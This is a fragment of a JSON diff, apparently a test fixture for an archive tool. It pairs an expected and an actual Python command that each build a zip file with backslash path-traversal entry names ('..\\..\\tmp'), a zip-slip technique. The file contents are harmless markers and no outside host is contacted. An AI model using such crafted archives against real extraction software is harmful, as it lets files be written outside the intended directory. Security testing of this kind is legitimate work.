+          "expectedCommand": "# Unicode文件名混淆\nimport zipfile, io, struct\n\nwith zipfile.ZipFile('encoded.zip', 'w') as zf:\n    # 使用反斜杠（Windows路径分隔符）\n    zf.writestr('..\\\\..\\\\..\\\\tmp\\\\test.txt', 'security_check')\n\n# 手工构造zip（修改中央目录文件名）\n# 使用UTF-8编码的路径遍历字符\nwith open('crafted.zip', 'rb') as f:\n    data = bytearray(f.read())\n    # 替换文件名中的编码字符\n    # ../变为 %2e%2e%2f 的原始字节",
+          "command": "import zipfile\nfrom pathlib import Path\n\nroot = Path(\"payloader-fixture\")\nroot.mkdir(exist_ok=True)\narchive_path = root / \"encoded.zip\"\nwith zipfile.ZipFile(archive_path, \"w\") as archive:\n    archive.writestr(r\"..\\outside\\PAYLOADER_MARKER.txt\", \"PAYLOADER_MARKER\")\nwith zipfile.ZipFile(archive_path, \"r\") as archive:\n    for info in archive.infolist():\n        print(repr(info.filename), info.flag_bits, info.file_size)\nraw = archive_path.read_bytes()\nprint(\"archive_bytes\", len(raw), \"contains_marker\", b\"PAYLOADER_MARKER\" in raw)"
+        }
+      ]
+    }
+  ]
+}
